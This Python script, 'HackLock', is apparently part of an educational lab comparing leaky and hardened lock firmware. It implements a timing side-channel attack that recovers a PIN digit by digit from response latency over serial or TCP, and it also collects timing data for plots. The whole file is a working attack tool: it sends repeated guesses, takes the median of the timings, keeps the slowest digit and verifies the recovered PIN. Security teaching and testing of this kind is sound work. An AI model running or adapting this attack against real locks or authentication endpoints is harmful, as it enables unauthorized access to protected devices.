#!/usr/bin/env python3
# ============================================================
#  HackLock - timing attack / measurement tool
#
#  Talks to the lock (real board over Serial, or the emulator
#  over TCP) using the firmware protocol:  "TRY <pin>" -> OK/NO.
#  It measures how long each answer takes and uses that to:
#
#    recover : guess the PIN one digit at a time, from timing alone
#    measure : collect raw timing samples into a CSV for plotting
#
#  Targets:
#    --target tcp:127.0.0.1:5555      (the emulator)
#    --target serial:COM5:115200      (Windows real board)
#    --target serial:/dev/ttyUSB0:115200   (Linux/macOS real board)
#
#  Examples:
#    python attack.py --target tcp:127.0.0.1:5555 recover --length 4
#    python attack.py --target serial:COM5:115200 recover --length 4
#    python attack.py --target tcp:127.0.0.1:5555 measure --out run.csv
#    python attack.py --target tcp:127.0.0.1:5555 measure --secret 1379 --out run.csv
# ============================================================

import argparse
import csv
import statistics
import time


# ----------------------- transports -----------------------
class TcpTransport:
    def __init__(self, host, port):
        import socket
        self.sock = socket.create_connection((host, port), timeout=5)
        self.f = self.sock.makefile("rwb", buffering=0)

    def try_pin(self, candidate):
        """Send one TRY and return (answer, elapsed_seconds)."""
        msg = f"TRY {candidate}\n".encode()
        t0 = time.perf_counter()
        self.f.write(msg)
        resp = self.f.readline()
        t1 = time.perf_counter()
        return resp.decode(errors="replace").strip(), (t1 - t0)

    def close(self):
        try:
            self.f.close(); self.sock.close()
        except Exception:
            pass


class SerialTransport:
    def __init__(self, port, baud):
        import serial  # pip install pyserial
        self.ser = serial.Serial(port, baud, timeout=2)
        time.sleep(2.0)            # wait out the ESP32 auto-reset on open
        self.ser.reset_input_buffer()

    def try_pin(self, candidate):
        self.ser.reset_input_buffer()
        msg = f"TRY {candidate}\n".encode()
        t0 = time.perf_counter()
        self.ser.write(msg)
        resp = self.ser.readline()      # reads up to the first OK/NO line
        t1 = time.perf_counter()
        return resp.decode(errors="replace").strip(), (t1 - t0)

    def close(self):
        try:
            self.ser.close()
        except Exception:
            pass


def open_target(spec):
    """spec: 'tcp:host:port' or 'serial:port:baud'."""
    parts = spec.split(":")
    kind = parts[0].lower()
    if kind == "tcp":
        host = parts[1]
        port = int(parts[2]) if len(parts) > 2 else 5555
        return TcpTransport(host, port)
    if kind == "serial":
        port = parts[1]
        baud = int(parts[2]) if len(parts) > 2 else 115200
        return SerialTransport(port, baud)
    raise ValueError(f"bad --target: {spec!r} (use tcp:host:port or serial:port:baud)")


# ----------------------- timing helpers -------------------
def timed_median(dev, candidate, samples):
    """Median elapsed time (seconds) for a candidate, over N samples."""
    times = []
    answer = "NO"
    for _ in range(samples):
        answer, dt = dev.try_pin(candidate)
        times.append(dt)
    return statistics.median(times), answer


# ----------------------- recover --------------------------
def recover(dev, length, digits, samples, filler):
    """
    Guess the PIN digit by digit.

    For each position we keep the prefix found so far, try every possible
    digit in that position (padding the rest with a fixed filler), and keep
    the digit whose answer is consistently the SLOWEST -- on the leaky
    firmware that is the correct one, because a correct digit costs extra time.
    """
    known = ""
    print(f"Recovering a {length}-digit PIN  (digits={digits}, {samples} samples/try)\n")
    for pos in range(length):
        scores = []
        for d in digits:
            candidate = known + d + (filler * (length - pos - 1))
            med, _ = timed_median(dev, candidate, samples)
            scores.append((med, d))
        scores.sort(reverse=True)                    # slowest first
        best_med, best_d = scores[0]
        runner_med, _    = scores[1]
        margin = (best_med - runner_med) * 1e6       # microseconds
        known += best_d
        print(f"  position {pos + 1}: '{best_d}'  "
              f"({best_med * 1e6:8.1f} us, +{margin:6.1f} us over 2nd)   prefix={known}")

    print(f"\nRecovered PIN candidate: {known}")
    answer, _ = dev.try_pin(known)
    print(f"Verification: TRY {known} -> {answer}  "
          f"({'correct' if answer == 'OK' else 'wrong - try more samples or check wiring'})")
    return known


# ----------------------- measure --------------------------
def measure(dev, length, samples, out, filler, secret=None):
    """
    Collect raw timing for candidates with 0..length correct leading digits,
    so plot.py can draw the 'staircase' that shows the leak.

    The test candidates are built from the correct PIN. Pass it with --secret
    (required for the hardened firmware, where timing reveals nothing); without
    it the PIN is first recovered from timing, which only works on the
    vulnerable firmware.
    """
    if secret is None:
        secret = recover(dev, length, "0123456789", max(samples // 3, 5), filler)
    else:
        length = len(secret)
    print(f"\nMeasuring timing vs correct-prefix length (PIN {secret}) into {out} ...")

    # Build one candidate per correct-prefix length 0..length.
    # correct prefix of k digits, then a deliberately wrong digit, then filler.
    def wrong_digit(c):
        return "0" if c != "0" else "1"

    candidates = []
    for k in range(length + 1):
        if k == length:
            candidates.append((k, secret))                      # fully correct
        else:
            prefix = secret[:k]
            bad = wrong_digit(secret[k])
            candidates.append((k, prefix + bad + filler * (length - k - 1)))

    rows = []
    for k, cand in candidates:
        for _ in range(samples):
            answer, dt = dev.try_pin(cand)
            rows.append({"correct_prefix": k, "candidate": cand,
                         "answer": answer, "elapsed_us": round(dt * 1e6, 2)})

    with open(out, "w", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=["correct_prefix", "candidate", "answer", "elapsed_us"])
        w.writeheader()
        w.writerows(rows)

    # quick summary
    print(f"wrote {len(rows)} rows\n")
    print("  correct_prefix   median_us")
    for k, _ in candidates:
        vals = [r["elapsed_us"] for r in rows if r["correct_prefix"] == k]
        print(f"        {k:>2}         {statistics.median(vals):9.1f}")


# ----------------------- main -----------------------------
def main():
    ap = argparse.ArgumentParser(description="HackLock timing attack / measurement tool")
    ap.add_argument("--target", required=True,
                    help="tcp:host:port  or  serial:port:baud")
    sub = ap.add_subparsers(dest="cmd", required=True)

    pr = sub.add_parser("recover", help="recover the PIN from timing")
    pr.add_argument("--length", type=int, default=4)
    pr.add_argument("--digits", default="0123456789")
    pr.add_argument("--samples", type=int, default=15)
    pr.add_argument("--filler", default="0")

    pm = sub.add_parser("measure", help="collect timing samples into a CSV")
    pm.add_argument("--length", type=int, default=4)
    pm.add_argument("--samples", type=int, default=40)
    pm.add_argument("--out", default="measurement.csv")
    pm.add_argument("--filler", default="0")
    pm.add_argument("--secret", default=None,
                    help="the correct PIN; required for the hardened firmware")

    args = ap.parse_args()
    dev = open_target(args.target)
    try:
        if args.cmd == "recover":
            recover(dev, args.length, args.digits, args.samples, args.filler)
        elif args.cmd == "measure":
            measure(dev, args.length, args.samples, args.out, args.filler, args.secret)
    finally:
        dev.close()


if __name__ == "__main__":
    main()
